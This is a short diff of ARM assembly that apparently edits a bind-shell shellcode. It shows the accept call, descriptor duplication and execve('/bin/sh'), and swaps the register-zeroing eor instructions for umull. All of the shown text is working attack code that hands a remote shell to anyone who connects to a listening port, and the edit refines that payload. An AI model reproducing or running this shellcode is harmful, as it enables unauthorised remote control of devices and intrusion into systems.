@@ -39,9 +39,9 @@ _start:
     svc    1    
     
     // r = accept(s, 0, 0);
-    // umull r1, r2, r0, r0
-    eor    r2, r2, r2   // r2 = 0
-    eor    r1, r1, r1   // r1 = 0
+    umull r1, r2, r0, r0
+    //eor    r2, r2, r2   // r2 = 0
+    //eor    r1, r1, r1   // r1 = 0
     mov    r0, r6       // r0 = s
     add    r7, #1       // r7 = 284+1 = 285 = accept    
     svc    1    
@@ -60,10 +60,10 @@ dup_loop:
     bpl    dup_loop
 
     // execve("/bin/sh", NULL, NULL);    
-    // umull r1, r2, r0, r0    
+    umull r1, r2, r0, r0    
     adr    r0, sh       // r0 = "/bin/sh" 
-    eor    r2, r2, r2   // r2 = NULL
-    eor    r1, r1, r1   // r1 = NULL
+    //eor    r2, r2, r2   // r2 = NULL
+    //eor    r1, r1, r1   // r1 = NULL
     strb   r2, [r0, #7] // add null terminator    
     mov    r7, #11      // r7 = execve
     svc    1
